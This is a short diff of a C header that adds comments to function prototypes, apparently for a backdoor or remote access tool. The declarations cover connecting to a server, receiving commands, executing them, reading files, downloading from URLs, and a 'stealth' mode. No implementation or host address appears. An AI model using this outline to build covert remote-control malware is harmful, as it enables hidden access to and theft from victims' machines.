@@ -36,20 +36,19 @@ typedef struct {
 
 } fileWrapper;
 
-char wrecvsid(int sock, int size, int *br);
-char incr(char ch);
-char decr(char ch);
-int iscommand(char buf);
-int download(char * url);
-int sendui(int s, char uin, int * bs);
-int sendprompt(SOCKET s, char uin);
-int setupvar(fileWrapper * file);
-int sendbuf(SOCKET s, char * buf, int size);
-int processdata(SOCKET s, char cmd, char cmd2);
-void change_dir(char * dir);
-int cat_file(char * f, char * pbuf);
-void stealth();
-void connect_sessionid(fileWrapper * file, int * cn, int * pbs, int * pbr, char * sessionID);
-int main_loop(fileWrapper * file);
-int executeCommand(fileWrapper * file);
-void connected(fileWrapper * file, int * cn);
+char wrecvsid(int sock, int size, int *br);		// function to receive session id
+char incr(char ch);					// increment by 1 char
+char decr(char ch);					// decrement by 1 char
+int iscommand(char buf);				// determine if it is a command or not
+int download(char * url);				// download function
+int sendui(int s, char uin, int * bs);			// send the user interface
+int sendprompt(SOCKET s, char uin);			// send prompt
+int setupvar(fileWrapper * file);			// setup variables at begining
+int sendbuf(SOCKET s, char * buf, int size);		// send buffer to server
+int processdata(SOCKET s, char cmd, char cmd2);		// process the received data
+void change_dir(char * dir);				// change current directory
+int cat_file(char * f, char * pbuf);			// read file
+void stealth();						// stealth mode
+int main_loop(fileWrapper * file);			// main function
+int executeCommand(fileWrapper * file);			// executing the buf function
+void connected(fileWrapper * file, int * cn);		// connect to the server
